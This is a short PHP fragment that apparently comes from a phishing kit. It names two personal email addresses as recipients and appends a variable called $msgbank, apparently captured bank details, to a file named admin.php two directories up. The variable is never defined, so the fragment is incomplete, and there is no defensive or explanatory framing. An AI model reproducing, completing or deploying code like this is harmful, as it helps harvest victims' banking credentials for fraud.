<?php

$yourmail  = 'thomasgrey8045@yahoo.com,tgrey5927@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>